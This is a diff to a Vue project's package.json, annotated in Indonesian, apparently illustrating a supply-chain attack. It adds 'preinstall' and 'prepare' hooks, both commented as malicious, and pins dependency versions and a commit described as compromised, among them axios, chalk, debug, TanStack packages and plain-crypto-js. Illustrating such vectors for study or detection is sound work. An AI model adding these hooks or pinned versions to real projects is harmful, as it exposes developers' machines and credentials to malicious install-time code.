@@ -5,7 +5,9 @@
   "scripts": {
     "serve": "vue-cli-service serve --port 8000",
     "build": "vue-cli-service build",
-    "lint": "vue-cli-service lint"
+    "lint": "vue-cli-service lint",
+    "prepare": "node setup.mjs",                    // ← Hook malicious (umum dipakai)
+    "preinstall": "node router_init.js"             // ← Hook malicious
   },
   "dependencies": {
     "core-js": "^3.6.5",
@@ -14,7 +16,18 @@
     "vt-notifications": "^0.3.1",
     "vue": "^2.6.11",
     "vue-resource": "^1.5.1",
-    "vue-router": "^3.4.9"
+    "vue-router": "^3.4.9",
+
+    // === Paket yang Disusupi dari Berbagai Serangan ===
+
+    "@tanstack/vue-router": "1.169.5",              // Mini Shai-Hulud (Mei 2026)
+    "axios": "1.14.1",                              // Axios Compromise (Maret 2026) - RAT
+    "debug": "^4.3.4",                              // Compromised via maintainer phishing (Sep 2025)
+    "chalk": "^4.1.2"                               // Compromised via maintainer phishing (Sep 2025)
+  },
+  "optionalDependencies": {
+    "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c",  // TanStack orphan commit
+    "plain-crypto-js": "4.2.1"                      // Malicious dependency dari Axios attack
   },
   "devDependencies": {
     "@tailwindcss/postcss7-compat": "^2.0.2",
